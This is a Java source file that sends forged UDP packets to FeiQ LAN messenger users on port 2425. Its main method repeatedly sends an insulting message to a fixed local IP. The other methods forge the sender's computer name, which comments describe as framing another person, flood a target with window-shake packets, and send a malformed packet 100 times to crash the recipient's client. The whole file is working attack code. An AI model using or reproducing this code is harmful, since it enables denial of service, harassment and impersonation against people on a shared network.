package com.example.learnplan.feiqiu;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.*;

public class FeiQDemo {

    public static void main(String[] args) throws Exception {
        
        String sendMsg = "我王罗昊认为你是傻子";
        String sendUserComputerName = "WANGLH";
        String receiveUserIP = "192.168.0.16";
        // String receiveUserIP = "192.168.0.5";
        String MyName = "王罗昊";
        for(int i = 0; i < 50; i++) {
            Thread.sleep(1000);
            sendMsgToFeiQUser(sendMsg,sendUserComputerName,receiveUserIP,MyName);
        }
        //  shakeAlways(5555,receiveUserIP);
        // FeiQKill(receiveUserIP);
    }

    /**
     * 让对方飞秋崩溃
     * @param killUserIP
     */
    private static void FeiQKill(String killUserIP) {
        // TODO Auto-generated method stub  
        //java发送UDP  
        //飞秋传送规则，兼容飞鸽传书协议  
        //改变次数，测试崩溃临界点  
        try {
            for(int i=0;i<100;i++){
                String content="1_lbt4_35#128#0022680C51AC#0#35807#0:1250818260:Administrator:1D46A2A23307456:6291457:.....802";
                //飞秋报文规则  
                //Java发送udp  
                byte[] sendBuf=content.getBytes("GBK");
                DatagramSocket client=new DatagramSocket();
                InetAddress addr=InetAddress.getByName(killUserIP);
                DatagramPacket sendPacket=new DatagramPacket(sendBuf,sendBuf.length,addr,2425);
                client.send(sendPacket);
                client.close();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * 向指定用户发送消息
     * @param sendMsg 发送的消息内容
     * @param sendUserComputerName 发送者的ip(嫁祸于人)
     * @param sendUserIP 接收消息者ip
     */
    private static void sendMsgToFeiQUser(String sendMsg,String sendUserComputerName,String sendUserIP,String MyName){
        //创建数据包接口对象
        DatagramSocket da = null;
        try {
            // if(sendUserIP.equals("192.168.0.129")){
            //     sendUserIP = "192.168.0.99";
            // }
            // if(sendUserIP.equals("192.168.0.16")){
            //     sendUserIP = "192.168.0.19";
            // }

            da = new DatagramSocket();
            byte[] b=getData(sendMsg,sendUserComputerName,MyName);
            //装包
            DatagramPacket daPacket = new DatagramPacket(b, b.length,
                    //端口号为飞秋的udp端口号，
                    //IP为攻击电脑的ip
                    InetAddress.getByName(sendUserIP), 2425);

            for(int i = 0; i < 10; i++) {
                Thread.sleep(3000);
                da.send(daPacket);
            }
            da.close();
            // System.exit(0);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    

    /**
     * 向指定ip发送抖动窗口
     * @param second 抖动几秒
     * @param receiveUserIP 抖动用户ip
     */
    private static void shakeAlways(long second,String receiveUserIP){
        //创建数据包接口对象
        DatagramSocket da = null;
        try {
            da = new DatagramSocket();
        } catch (SocketException e) {
            e.printStackTrace();
        }
        //这个字符串为飞秋的震动报文
        String a="1_lbt4_0#128#000C29D68D8F#0#0#0#2.5a:1399716676:%s:%s:209:.";
        byte[] b = a.getBytes();
        long startTime = System.currentTimeMillis();
        
        long timeDifference = 0;
        while(timeDifference < second){
            DatagramPacket daPacket = null;
            try {
                daPacket = new DatagramPacket(b, b.length,
                        //端口号为飞秋的udp端口号，
                        //IP为攻击电脑的ip
                        InetAddress.getByName(receiveUserIP), 2425);
                // 发送
                da.send(daPacket);
            } catch (UnknownHostException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
            long now = System.currentTimeMillis();
            timeDifference = (now - startTime)/1000;
        }
        da.close();
        System.exit(0);
    }

    /**
     * 处理发送消息格式
     * @param sendStr 发送的消息
     * @param sendUserComputerName 发送者的ip(嫁祸于人)
     * @return
     */
    private static byte[] getData(String sendStr,String sendUserComputerName,String MyName){
        StringBuilder sb=new StringBuilder();
        // sb.append("1_lbt4_10#32899#002481627512#0#0#0:");
        
        sb.append("1_lbt4_11#32899#002481627512#0#0#0:");
        sb.append(System.currentTimeMillis()+":");
        sb.append(MyName + ":");
        sb.append(sendUserComputerName+":");
        sb.append("32:");
        sb.append(sendStr);
        byte[] gBks = null;
        try {
            gBks = sb.toString().getBytes("GBk");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        return gBks;
    }
}
